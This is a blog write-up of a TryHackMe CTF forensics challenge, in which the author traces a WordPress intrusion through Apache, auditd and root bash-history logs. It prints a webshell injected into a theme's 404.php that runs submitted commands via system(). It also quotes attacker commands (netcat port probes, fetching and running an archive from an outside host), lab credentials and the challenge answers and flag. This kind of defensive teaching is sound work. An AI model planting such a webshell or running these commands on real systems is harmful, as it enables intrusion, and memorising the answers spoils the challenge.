---
layout: post
title: "[TryHackMe] Honeynet Collapse 2025 - Initial Access Pot"
date: 2025-07-29 14:00:00 +0530
categories: [TryHackMe, CTF]
tags: [honeynet, initial access, ssh, apache, auditd, logs]
pin: false
---

This is the first challenge of the Honeynet Collapse CTF 2025, I didn't compete in this but was able to solve the challenge before it went off the site.
![Challenge_Info](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/Challenge_info.png)
Let's connect via SSH using the provided credentials.
<br>

### 1) Which web page did the attacker attempt to brute force? [Easy: 30 Points] 

First, we try to identify what web server is running on the machine, checking for the most common web server services on Linux.

```bash
ps aux | grep -E 'apache2|nginx'
```

![Running_Server](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/check_running_server.png)
The server is running **Apache2** so let's take a look at it's logs.

```bash
sudo less /var/log/apache2/access.log
```

On scrolling down a little we'll find these logs, which seem to be continuous requests from the attacker's IP indicating a brute-force attack, it's visible that the attacker brute-forced the wordpress login.

![Brute_Force](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/brute_force.png)
Hence the answer is : ```/wp-login.php```
<br>

### 2) What is the absolute path to the backdoored PHP file? [Medium: 60 Points]

The attacker has installed a backdoor, therefore we need to look for a suspicious **POST request**

```bash
grep POST /var/log/apache2/access.log
```

![Backdoored_File](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/Backdoored_file.png)
We need the absolute path of the backdoored file which is **404.php** as we can see it has been tampered with, so let's navigate to it.

Let's find it using the command:-
```bash
sudo find /var/www/html/ -type f -name "404.php"
```
Here we go,
![Absolute_Path](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/absolute_path.png)
Let's view it using:-
```bash
cat /var/www/html/wordpress/wp-content/themes/blocksy/404.php
```

Well, we have our confirmation:-
```
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package Blocksy
 */

get_header();

if (
        function_exists('blc_get_content_block_that_matches')
        &&
        blc_get_content_block_that_matches([
                'template_type' => '404',
                'match_conditions' => false
        ])
) {
        echo blc_render_content_block(
                blc_get_content_block_that_matches([
                        'template_type' => '404',
                        'match_conditions' => false
                ])
        );
} else {
        if (
                ! function_exists('elementor_theme_do_location')
                ||
                ! elementor_theme_do_location('single')
        ) {
                get_template_part('template-parts/404');
        }
}

if (isset($_GET['doing_wp_corn']) && $_GET['doing_wp_corn'] === "t") {
    echo '<form method="POST" style="width: 500px; max-width: fit-content; margin-left: auto; margin-right: auto;">
            <input type="text" name="cmd" style="width: 300px;">
            <input type="submit" value="Run">
          </form>';

    if (isset($_POST['cmd'])) {
        echo '<pre style="width: 500px; margin-left: auto; margin-right: auto; white-space:pre-line;">';
        system($_POST['cmd']);
        echo "</pre>";
    }
}

get_footer();
```
The script has been tampered with, we can see a webshell script injected at the bottom.

Therefore, the absolute path will be 
``/var/www/html/wordpress/wp-content/themes/blocksy/404.php``
<br>

### 3) Which file path allowed the attacker to escalate to root? [Easy: 30 Points]

For this we'll first check the auditd logs, the attacker may have tried to execute commands
```bash 
sudo ausearch -m execve -i 
```

![Socat_Usage](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/socat_usage.png)
Interesting discovery, attacker is trying to setup a socket cat connection between them and the target.

![Searching_env](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/env_search.png)
We can see that the attacker is trying to find files with .env suffix, often used to store API keys, secrets, tokens etc

![SSH_key_found](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/ssh_key_found.png)
The attacker has managed to find the private ssh key of the system, which they can now use to authenticate as root.
Hence the answer is: ``/etc/ssh/id_ed25519.bak``

![Root_Access](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/root_access.png)
Attacker now has root access.


### 4) Which IP was port-scanned after the privilege escalation? [Medium: 60 Points]

Now that the attacker has gained root access as evident from the last log.
We'll check ssh logs..
Attacker got access on **06/27/25 22:08:07.413:537**
*(MM/DD/YY HH:MM:SS.milliseconds:event_id)*

No logs in auditd after this point in time so let's check the bash history, we'll use the command:-
```bash
ubuntu@deceptipot-demo:~$ sudo cat /root/.bash_history
hostnamectl set-hostname deceptipot-demo
exit
cd ~
wget https://assets.deceptipot-emea.deceptitech.thm -O ~/deceptipot.zip
cd deceptipot
nano deceptipot.conf
./deceptipot --init
./deceptipot -c deceptipot.conf
ps aux
exit
ls -la ~
nano .ssh/authorized_keys 
cat ~/deceptipot/README.md 
cat ~/deceptipot/deceptipot.conf 
ps aux
pkill deceptipot
ip a
for ip in 172.16.8.{200..254}; do ping -c1 ${ip} & done
nc -w 2 -v 172.16.8.216 22
nc -w 2 -v 172.16.8.216 80
nc -w 2 -v 172.16.8.216 3389
nc -v 172.16.8.216 3389
scp ubuntu@167.172.41.141:~/5841.tar.gz 5841.tar.gz
tar xzf 5841.tar.gz
cd 5841
ls
bash run.sh
cd ..
rm -rf ./5841
rm -rf 5841.tar.gz
exit
ls
exit
```

The attacker used these netcat commands to see if the ports in question are open :-
```bash
nc -w 2 -v 172.16.8.216 22
nc -w 2 -v 172.16.8.216 80
nc -w 2 -v 172.16.8.216 3389
nc -v 172.16.8.216 3389
```

Thus, the answer: ``172.16.8.216``
<br>

### 5) What is the MD5 hash of the malware persisting on the host? [Hard: 120 Points] 
A quick google search on persistence mechanisms on linux lists:-
1. **System Services**:  
    – Systemd Service Persistence: This method involves creating or modifying systemd service files to execute malicious code upon system initialization.  
    – SysV Init (init.d) Persistence: This leverages the older SysV init system, using scripts placed in /etc/init.d/ to run malware during system initialization.
2. **User-level Persistence**:  
    – SSH Key Persistence: This method adds a backdoor SSH key to the authorized keys, allowing an attacker to log in remotely.  
    – Shell Profile Persistence: Modifying shell profile files like .bashrc ensures that malicious scripts run each time a user starts a shell session.
3. **Cron Jobs and Scheduled Tasks**:  
    – Cron Job Persistence: An attacker can add cron jobs to ensure a script is executed at regular intervals or during system reboots.  
    – At Job Persistence: This can schedule one-time or recurring tasks to maintain persistence.
4. **File and Package Modifications**:  
    – Malicious Packages (DPKG/RPM): Attackers can create malicious Debian or RPM packages that install backdoors and ensure persistence during package installations or updates.  
    – Password and User Modifications: adding new users to /etc/passwd or modifying existing user passwords to maintain access.
5. **Other Techniques**:  
    – SUID Backdoor: Modifying SUID (Set User ID) binaries can grant an attacker elevated privileges when running specific programs.  
    – Docker Container Persistence: Attackers can use a Docker container with a host escape mechanism to maintain access across reboots.
> — [Source](https://securityboulevard.com/2024/10/linux-persistence-mechanisms-and-how-to-find-them/)
<br>

So let's check systemmd services first
```bash
cd /etc/systemd/system
```

and then:-
```bash
ubuntu@deceptipot-demo:/etc/systemd/system$ ls -lt
total 132
drwxr-xr-x 2 root root 4096 Jul 28 12:14  multi-user.target.wants
-rw-r--r-- 1 root root  180 Jun 23 15:53  deceptipot.service
drwxr-xr-x 2 root root 4096 Jun 23 13:53  timers.target.wants
drwxr-xr-x 2 root root 4096 Jun 20 14:11  snapd.mounts.target.wants
-rw-r--r-- 1 root root  326 Jun 20 14:11  snap-core22-2010.mount
-rw-r--r-- 1 root root  326 Jun 20 14:11  snap-snapd-24718.mount
drwxr-xr-x 2 root root 4096 Jun 10 10:06  sysinit.target.wants
lrwxrwxrwx 1 root root   38 Jun 10 10:06  chronyd.service -> /usr/lib/systemd/system/chrony.service
drwxr-xr-x 2 root root 4096 Jun 10 10:06  paths.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:06  sockets.target.wants
-rw-r--r-- 1 root root  589 Jun 10 10:05  snap.amazon-ssm-agent.amazon-ssm-agent.service
-rw-r--r-- 1 root root  359 Jun 10 10:05 'snap-amazon\x2dssm\x2dagent-11320.mount'
-rw-r--r-- 1 root root  326 Jun 10 10:05  snap-core22-1981.mount
-rw-r--r-- 1 root root  326 Jun 10 10:05  snap-snapd-24505.mount
lrwxrwxrwx 1 root root   44 Jun 10 10:02  dbus-org.freedesktop.ModemManager1.service -> /usr/lib/systemd/system/ModemManager.service
drwxr-xr-x 2 root root 4096 Jun 10 10:02  graphical.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  sleep.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  emergency.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  rescue.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  suspend-then-hibernate.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  hibernate.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  hybrid-sleep.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  suspend.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  ssh.service.requires
drwxr-xr-x 2 root root 4096 Jun 10 10:02  cloud-init.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  cloud-config.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  final.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  cloud-final.service.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  open-vm-tools.service.requires
lrwxrwxrwx 1 root root   45 Jun 10 10:02  vmtoolsd.service -> /usr/lib/systemd/system/open-vm-tools.service
lrwxrwxrwx 1 root root   42 Jun 10 10:02  iscsi.service -> /usr/lib/systemd/system/open-iscsi.service
drwxr-xr-x 2 root root 4096 Jun 10 10:02  mdmonitor.service.wants
drwxr-xr-x 2 root root 4096 Jun 10 10:02  sysstat.service.wants
lrwxrwxrwx 1 root root   48 Jun 10 10:00  dbus-org.freedesktop.resolve1.service -> /usr/lib/systemd/system/systemd-resolved.service
lrwxrwxrwx 1 root root   39 Jun 10 10:00  syslog.service -> /usr/lib/systemd/system/rsyslog.service
drwxr-xr-x 2 root root 4096 Jun 10 10:00  getty.target.wants
drwxr-xr-x 2 root root 4096 Jun 10 09:59  network-online.target.wants
-rw-r--r-- 1 root root  472 Mar 27 21:10  badr.service
-rw-r--r-- 1 root root  165 Mar 31  2024  kworker.service
```

These two services looks suspicious:-
```bash
-rw-r--r-- 1 root root  472 Mar 27 21:10  badr.service
-rw-r--r-- 1 root root  165 Mar 31  2024  kworker.service
```

kworker is a legitimate kernel thread but not something that should appear as a service in systemd, badr.service also doesn't ring a bell.

Let's check the stats:-
![Systemd_stats](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/systemd_stats.png)
We can see that kworker.service was changed on 2025-06-27 at 22:15:13 which is right after the attacker gained root access to our machine.
<br>
Let's get the md5 hash of the file:-
![File_in_question](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/md5hash.png)

```bash
ubuntu@deceptipot-demo:/etc/systemd/system$ md5sum /usr/sbin/kworker 
d6f2d80e78f264aff8c7aea21acb6ca6  /usr/sbin/kworker
```

### 6) Can you access the DeceptiPot in recovery mode? [Bonus: 25 Points]
Let's recall these lines from the bash history:-
```bash
ubuntu@deceptipot-demo:~$ sudo cat /root/.bash_history
hostnamectl set-hostname deceptipot-demo
exit
cd ~
wget https://assets.deceptipot-emea.deceptitech.thm -O ~/deceptipot.zip
cd deceptipot
nano deceptipot.conf
./deceptipot --init
./deceptipot -c deceptipot.conf
ps aux
exit
ls -la ~
nano .ssh/authorized_keys 
cat ~/deceptipot/README.md 
cat ~/deceptipot/deceptipot.conf 
ps aux
pkill deceptipot
```

Let's run the command 'deceptipot -h' for some info
![Deceptipot_help](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/deceptipot_help.png)
Let's look at the conf file, maybe it'll give us some info:-
These were run as root so let's first navigate to root, (switching to root for convenience using sudo su)
![Deceptipot_readme](assets/img/tryhackme/Honeynetcollapse25/InitialAccessPot/deceptipot_readme.png)

Interesting...
```bash
root@deceptipot-demo:~/deceptipot# cat deceptipot.conf 
# This is a DeceptiPot template.
# 1. Edit the parameters according to your needs,
# 2. Apply them as "sudo /usr/bin/deceptipot -c deceptipot.conf",
# 3. The settings are now stored in DeceptiPot, DELETE THIS FILE.

[pot]
# How and where to host a DeceptiPot
root = /var/www/html
user = deceptisvc
containerize = false

[replication]
# Which resource to mimic {web|ssh|db|k8s|custom}
type = web
web_lang = wordpress
web_url = https://172.16.8.8/blog/*
# Whether to mimic website database structure as well
web_copydb = true
# One-time operation, remove SSH key after the replication
web_copydb_acces = ssh
web_copydb_sshuser = root
web_copydb_sshkey = /etc/ssh/id_ssh25519
web_copydb_rootpass = Em1lyR0ss_DeCePti!

[monitoring]
# Which data to collect from the DeceptiPot
yara = false
falco = false
tcpdump = false
weblogs = true
authlogs = true
auditd = true

[reporting]
# Where to send the DeceptiPot logs
elastic = true
elastic_user = emily
elastic_pass = Em1lyR0ss_DeCePti!
elastic_url = https://es-staging.deceptipot-emea.deceptitech.thm

[security]
# Recovery key to change DeceptiPot settings after deployment
reckey = Em1lyR0ss_DeCePti!
# Disables all DeceptiPot security features, use with caution
debugmode = true
```

There we have it, the recovery key i.e  ``Em1lyR0ss_DeCePti!``

```bash
root@deceptipot-demo:/home/ubuntu# deceptipot -r Em1lyR0ss_DeCePti!
Loading... Access granted: THM{acc3ss_gr4nt3d!}
```
